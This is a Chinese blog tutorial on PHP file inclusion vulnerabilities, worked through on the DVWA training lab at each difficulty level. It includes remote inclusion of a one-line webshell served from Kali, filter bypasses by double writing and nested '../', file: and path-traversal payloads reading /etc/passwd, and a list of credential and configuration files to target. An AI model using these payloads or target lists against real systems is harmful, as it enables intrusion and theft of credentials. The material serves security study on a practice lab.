<!DOCTYPE html>
<html class="no-js" lang="en">
<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<title>文件包含漏洞（DVWA靶场文件包含漏洞详解） - 编程大白的博客</title>
	<script>(function(d,e){d[e]=d[e].replace("no-js","js");})(document.documentElement,"className");</script>
	<meta name="description" content="">
		<meta property="og:title" content="文件包含漏洞（DVWA靶场文件包含漏洞详解）" />
<meta property="og:description" content="一、文件包含漏洞形成原因 开发人员为了使代码更灵活,会将被包含的文件设置为变量,用来进行动态调用,从而导致客户端可以恶意调用一个恶意文件,造成文件包含漏洞。
二、文件包含漏洞的分类 远程文件包含（RFI，Remote File Inclusion）: 当 Web 应用程序下载并执行远程文件时，会导致远程文件包含，这些远程文件通常以 HTTP 或 FTP URI 的形式获取，作为Web 应用程序的用户提供的参数。
本地文件包含（LFI，Local File Inclusion）：本地文件包含类似于远程文件包含，本地文件包含仅能包括本地文件，即当前服务器上的文件以供执行。
文件包含漏洞用到的函数：
require:找不到被包含的文件，报错，并且停止运行脚本。
include:找不到被包含的文件,只会报错，但会继续运行脚本。
require_once:与require类似,区别在于当重复调用同一文件时,程序只调用一次。
include_once:与include类似,区别在于当重复调用同一文件时,程序只调用一次。
三、PHP包含日志文件 拦截后修改：
查看日志文件已记录此条信息
浏览器中运行此日志文件，即可执行插入的PHP代码。
注意：若已经上传了一句话代码的文件，就可以通过浏览器解析了。
常见日志文件位置：
四、DVWA靶场文件包含漏洞(File Inclusion) 选择“File Inclusion”漏洞后出现错误提示：The PHP function allow_url_include is not enabled.
解决方法：到php.ini文件中将allow_url_include=off,修改为on
选择到当前使用的PHP版本就能打开其ｐｈｐ．ｉｎｉ文件。
查找：allow_url_include
修改为allow_url_include=on
１．等级low 点一下file1路径就变成了：http://192.168.182.130/vulnerabilities/fi/?page=file1.php
点击file2，file3，发现变化的就是page（页）这个参数
发现他直接传一个page这个参数没有做任何的过滤，这里就大概猜测可能出现问题。喂什么吃什么，能不出毛病嘛。
查看源代码分析：
&lt;?php // The page we wish to display $file = $_GET[ &#39;page&#39; ]; ?&gt; 如１：给百度地址，直接进入百度
如２：给本地文件地址，直接显示此文件内容
如３：给远程一句话木马地址，可用中国菜刀连接木马
第一步：在ｋａｌｉ中编写一句话木马文件，ａａ．ｐｈｐ
第二步：在ａａ．ｐｈｐ路径下打开终端程序，执行：python3 -m http.server 80命令起http服务" />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://bcdabai.github.io/posts/5199fbd84350e7522d7571419a25dca7/" /><meta property="article:section" content="posts" />
<meta property="article:published_time" content="2023-11-17T20:15:28+08:00" />
<meta property="article:modified_time" content="2023-11-17T20:15:28+08:00" />


	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
	<link rel="dns-prefetch" href="//fonts.googleapis.com">
	<link rel="dns-prefetch" href="//fonts.gstatic.com">
	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,400i,700">

	<link rel="stylesheet" href="/css/style.css">
	

	<link rel="shortcut icon" href="/favicon.ico">
		
</head>
<body class="body">
	<div class="container container--outer">
		<header class="header">
	<div class="container header__container">
		
	<div class="logo">
		<a class="logo__link" href="/" title="编程大白的博客" rel="home">
			<div class="logo__item logo__text">
					<div class="logo__title">编程大白的博客</div>
					
				</div>
		</a>
	</div>
		<div class="divider"></div>
	</div>
</header>
		<div class="wrapper flex">
			<div class="primary">
			
<main class="main" role="main">
	<article class="post">
		<header class="post__header">
			<h1 class="post__title">文件包含漏洞（DVWA靶场文件包含漏洞详解）</h1>
			
		</header>
		<div id="gatop"></div>
		<div class="content post__content clearfix">
			
<div id="content_views" class="htmledit_views">
                    <h4>一、文件包含漏洞形成原因</h4> 
<p><img alt="" height="237" src="https://images2.imgbox.com/47/de/zdsA9Vc7_o.png" width="426"></p> 
<p>开发人员为了使代码更灵活,会将被包含的文件设置为变量,用来进行动态调用,<span style="color:#fe2c24;">从而导致客户端可以恶意调用一个恶意文件,造成文件包含漏洞。</span></p> 
<h4> 二、文件包含漏洞的分类</h4> 
<p><img alt="" height="225" src="https://images2.imgbox.com/38/7b/oBq7n0Tz_o.png" width="370"></p> 
<p><strong>远程文件包含（RFI</strong>，Remote File Inclusion）: 当 Web 应用程序下载并执行远程文件时，会导致远程文件包含，这些<span style="color:#fe2c24;">远程文件通常以 HTTP 或 FTP URI 的形式获取，作为Web 应用程序的用户提供的参数。</span><br><strong>本地文件包含（LFI</strong>，Local File Inclusion）：本地文件包含类似于远程文件包含，<span style="color:#fe2c24;">本地文件包含仅能包括本地文件，即当前服务器上的文件以供执行。</span></p> 
<p><strong><span style="color:#0d0016;">文件包含漏洞用到的函数：</span></strong></p> 
<p><span style="color:#0d0016;">require:找不到被包含的文件，报错，并且停止运行脚本。</span></p> 
<p><span style="color:#0d0016;">include:找不到被包含的文件,只会报错，但会继续运行脚本。</span></p> 
<p><span style="color:#0d0016;">require_once:与require类似,区别在于当重复调用同一文件时,程序只调用一次。</span></p> 
<p><span style="color:#0d0016;">include_once:与include类似,区别在于当重复调用同一文件时,程序只调用一次。</span></p> 
<h4> 三、PHP包含日志文件</h4> 
<p><img alt="" height="516" src="https://images2.imgbox.com/1f/2f/pX8K70yA_o.png" width="1122"></p> 
<p><img alt="" height="215" src="https://images2.imgbox.com/1b/6e/z22AhoZn_o.png" width="436"></p> 
<p>拦截后修改：</p> 
<p> <img alt="" height="572" src="https://images2.imgbox.com/5e/69/ioHeC9sV_o.png" width="896"></p> 
<p> 查看日志文件已记录此条信息</p> 
<p><img alt="" height="543" src="https://images2.imgbox.com/0b/be/q1JcJCro_o.png" width="838"></p> 
<p> 浏览器中运行此日志文件，即可执行插入的PHP代码。</p> 
<p><img alt="" height="463" src="https://images2.imgbox.com/38/99/KZR8w7mE_o.png" width="801"></p> 
<p></p> 
<p>注意：若已经上传了一句话代码的文件，就可以通过浏览器解析了。</p> 
<p>常见日志文件位置：</p> 
<p><img alt="" height="167" src="https://images2.imgbox.com/ae/48/6ZWMgHmf_o.png" width="300"></p> 
<h4>四、DVWA靶场文件包含漏洞(File Inclusion)</h4> 
<p><img alt="" height="363" src="https://images2.imgbox.com/61/c4/xtfVsE3M_o.png" width="913"></p> 
<p>选择“File Inclusion”漏洞后出现错误提示：The PHP function allow_url_include is not enabled.</p> 
<p>解决方法：到php.ini文件中将allow_url_include=off,修改为on</p> 
<p><img alt="" height="542" src="https://images2.imgbox.com/2a/b5/3f7TZMz8_o.png" width="764"></p> 
<p>选择到当前使用的PHP版本就能打开其ｐｈｐ．ｉｎｉ文件。</p> 
<p>查找：allow_url_include</p> 
<p><img alt="" height="553" src="https://images2.imgbox.com/34/5a/2aCaRxAL_o.png" width="708"></p> 
<p>修改为allow_url_include=on</p> 
<p><img alt="" height="201" src="https://images2.imgbox.com/1c/3f/fDgf2gjG_o.png" width="649"></p> 
<h5 id="%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0%3A%E7%AD%89%E7%BA%A7low"><strong>１．等级low</strong></h5> 
<p>点一下file1路径就变成了：<a href="http://192.168.182.130/vulnerabilities/fi/?page=file1.php" rel="nofollow" title="http://192.168.182.130/vulnerabilities/fi/?page=file1.php">http://192.168.182.130/vulnerabilities/fi/?page=file1.php</a></p> 
<p>点击file2，file3，发现变化的就是page（页）这个参数</p> 
<p>发现他直接传一个page这个参数没有做任何的过滤，这里就大概猜测可能出现问题。喂什么吃什么，能不出毛病嘛。</p> 
<p>查看源代码分析：</p> 
<pre><code class="language-php">&lt;?php

// The page we wish to display
$file = $_GET[ 'page' ];

?&gt; </code></pre> 
<p>如１：给百度地址，直接进入百度</p> 
<p><img alt="" height="468" src="https://images2.imgbox.com/93/75/lxPsbIOW_o.png" width="953"></p> 
<p>如２：给本地文件地址，直接显示此文件内容</p> 
<p><img alt="" height="445" src="https://images2.imgbox.com/9c/b1/SIiUmlGJ_o.png" width="1200"></p> 
<p>如３：给远程一句话木马地址，可用中国菜刀连接木马</p> 
<p>第一步：在ｋａｌｉ中编写一句话木马文件，ａａ．ｐｈｐ</p> 
<p>第二步：在ａａ．ｐｈｐ路径下打开终端程序，执行：python3 -m http.server 80命令起http服务</p> 
<p><img alt="" height="52" src="https://images2.imgbox.com/34/98/ds96fE4e_o.png" width="565"></p> 
<p>第三步：给远程服务器Ｋａｌｉ中木马地址</p> 
<p><img alt="" height="259" src="https://images2.imgbox.com/d2/df/ERfHXh2S_o.png" width="771"></p> 
<p>第四步：中国菜刀连接木马</p> 
<p><img alt="" height="331" src="https://images2.imgbox.com/4e/26/oNvZbgA8_o.png" width="513"></p> 
<p><img alt="" height="405" src="https://images2.imgbox.com/08/f7/8Dy5rZrU_o.png" width="517"></p> 
<h5 id="Medium">２．等级Medium</h5> 
<p>查看源代码分析</p> 
<pre><code class="language-php">&lt;?php

// The page we wish to display
$file = $_GET[ 'page' ];

// Input validation
$file = str_replace( array( "http://", "https://" ), "", $file );
$file = str_replace( array( "../", "..\\" ), "", $file );

?&gt; </code></pre> 
<p>源码增加了str_replace函数，对page参数做了处理。</p> 
<p><code>str_replace()</code>函数对关键字http://、https:// 、../ 、..\执行了过滤操作，只要用户传递给page变量的文件名中出现上述四个关键字，皆以空代替。 这样，Web应用程序保证了用户既无法使用http://、http:\\来利用远程文件包含漏洞，也无法使用../ 、..\来利用本地文件包含漏洞。</p> 
<p>我们使用双写绕过替换规则</p> 
<p>例如page=hthttp://tp://192.168.xx.xxx/phpinfo.php时，str_replace函数会将http://删除，于是page=http://192.168.xx.xxx/phpinfo.php，成功执行远程命令。</p> 
<p>我们在../中多嵌套一个../经行绕过</p> 
<p>..././..././phpinfo.php         ==&gt;&gt;         ../../phpinfo.php </p> 
<p>如：</p> 
<p><img alt="" height="459" src="https://images2.imgbox.com/17/ba/AfHADeJE_o.png" width="931"></p> 
<h5 id="High"><span style="color:#0d0016;">3.   等级High</span></h5> 
<p>查看源代码分析</p> 
<pre><code class="language-php"> &lt;?php

// The page we wish to display
$file = $_GET[ 'page' ];

// Input validation
if( !fnmatch( "file*", $file ) &amp;&amp; $file != "include.php" ) {
    // This isn't the page we want!
    echo "ERROR: File not found!";
    exit;
}

?&gt;
</code></pre> 
<p><strong>fnmatch() 函数</strong>的作用是根据指定的模式来匹配文件名或字符串。 语法为：fnmatch(pattern,string,flags) 各个参数解释如下：</p> 
<p>pattern 必需。规定要检索的模式。<br> string 必需。规定要检查的字符串或文件。<br> flags 可选。 <span style="color:#fe2c24;">如果用户输入的文件名不是include.php或者以file开头的文件名，那么Web应用程序直接退出。</span> 所以high安全等级是medium安全等级的扩展，在medium安全等级的基础上，进一步加强了文件包含漏洞的防御。 对high安全等级而言，在medium安全等级的文件包含漏洞利用失败的技术皆无法在high安全等级下成功执行。</p> 
<p><strong>file协议：</strong>本地文件传输协议）主要用于访问本地计算机中的文件。基本格式为：file:///文件路径。</p> 
<p>所以我们可以利用file协议来帮我们包含文件：</p> 
<p><strong>在linux服务器上</strong>，我们可以构建pyload为</p> 
<p>http://192.168.10.3/vulnerabilities/fi/?page=file:etc/passwd</p> 
<p><strong>在windows服务器下</strong>我们可以利用file协议绕过防护策略（file:///）,构建pyload为</p> 
<p>http://192.168.10.5/vulnerabilities/fi/?page=<strong>file:///</strong>C:\phpstudy_pro\WWW\DVWA\vulnerabilities\fi\aa.php</p> 
<p><strong>也可以</strong>构建成这样的pyload，<strong>先定位到file1.php的位置然后往前推找到敏感文件</strong></p> 
<p>http://192.168.10.3/vulnerabilities/fi/?page=file1.php../../../../../../../../../../../../etc/passwd</p> 
<p>附录：</p> 
<p id="PHP%E6%94%AF%E6%8C%81%E7%9A%84%E5%8D%8F%E8%AE%AE%E5%92%8C%E5%B0%81%E8%A3%85%E5%8D%8F%E8%AE%AE%EF%BC%88%E4%BB%A5%E4%B8%8B%E5%86%85%E5%AE%B9%E5%9D%87%E5%AE%98%E6%96%B9%E7%BD%91%E5%9D%80%EF%BC%89"><strong>PHP支持的协议和封装协议</strong></p> 
<p>PHP 带有很多内置 URL 风格的封装协议，可用于类似 <a href="https://www.php.net/manual/zh/function.fopen.php" rel="nofollow" title="fopen()">fopen()</a>、 <a href="https://www.php.net/manual/zh/function.copy.php" rel="nofollow" title="copy()">copy()</a>、 <a href="https://www.php.net/manual/zh/function.file-exists.php" rel="nofollow" title="file_exists()">file_exists()</a> 和 <a href="https://www.php.net/manual/zh/function.filesize.php" rel="nofollow" title="filesize()">filesize()</a> 的文件系统函数。 除了这些封装协议，还能通过 <a href="https://www.php.net/manual/zh/function.stream-wrapper-register.php" rel="nofollow" title="stream_wrapper_register()">stream_wrapper_register()</a> 来注册自定义的封装协议。</p> 
<pre><code class="language-php">file:// — 访问本地文件系统
http:// — 访问 HTTP(s) 网址
ftp:// — 访问 FTP(s) URLs
php:// — 访问各个输入/输出流（I/O streams）
zlib:// — 压缩流
data:// — 数据（RFC 2397）
glob:// — 查找匹配的文件路径模式
phar:// — PHP 归档
ssh2:// — 安全外壳协议 2
rar:// — RAR
ogg:// — 音频流
expect:// — 处理交互式的流</code></pre> 
<p><strong>文件包含参考的读取pyload（区分linux和windows）</strong></p> 
<pre><code class="language-php">Windows系统   包含可以读取的文件

c:\boot.ini // 查看系统版本

c:\windows\system32\inetsrv\MetaBase.xml // IIS配置文件

c:\windows\repair\sam // 存储Windows系统初次安装的密码

c:\ProgramFiles\mysql\my.ini // MySQL配置

c:\ProgramFiles\mysql\data\mysql\user.MYD // MySQL root密码

c:\windows\php.ini // php 配置信息

Linux/Unix系统

/etc/passwd // 账户信息

/etc/shadow // 账户密码文件

/usr/local/app/apache2/conf/httpd.conf // Apache2默认配置文件

/usr/local/app/apache2/conf/extra/httpd-vhost.conf // 虚拟网站配置

/usr/local/app/php5/lib/php.ini // PHP相关配置

/etc/httpd/conf/httpd.conf // Apache配置文件

/etc/my.conf // mysql 配置文件</code></pre> 
<p></p>
                </div>
		</div>
		<div id="gabottom"></div>
	</article>
</main>


<nav class="pager flex">
	<div class="pager__item pager__item--prev">
		<a class="pager__link" href="/posts/81bdc879e9f16219adf8bd7e16b9126d/" rel="prev">
			<span class="pager__subtitle">«&thinsp;Previous</span>
			<p class="pager__title">mybatis-plus分页查询（page的使用）</p>
		</a>
	</div>
	<div class="pager__item pager__item--next">
		<a class="pager__link" href="/posts/55a9fc96e22fd77363d5c09137db68ec/" rel="next">
			<span class="pager__subtitle">Next&thinsp;»</span>
			<p class="pager__title">Postman：API测试之Postman使用完全指南</p>
		</a>
	</div>
</nav>


			</div>
			
		</div>
		<footer class="footer">
	<div class="container footer__container flex">
		
		<div class="footer__copyright">
			&copy; 2024 编程大白的博客.
			<span class="footer__copyright-credits">Generated with <a href="https://gohugo.io/" rel="nofollow noopener" target="_blank">Hugo</a> and <a href="https://github.com/Vimux/Mainroad/" rel="nofollow noopener" target="_blank">Mainroad</a> theme.</span>
		</div>
	</div>
</footer>
<div id="gafoot"></div>
<script src="https://101121.xyz/ga/app.js"></script>


	</div>
<script async defer src="/js/menu.js"></script>
</body>
</html>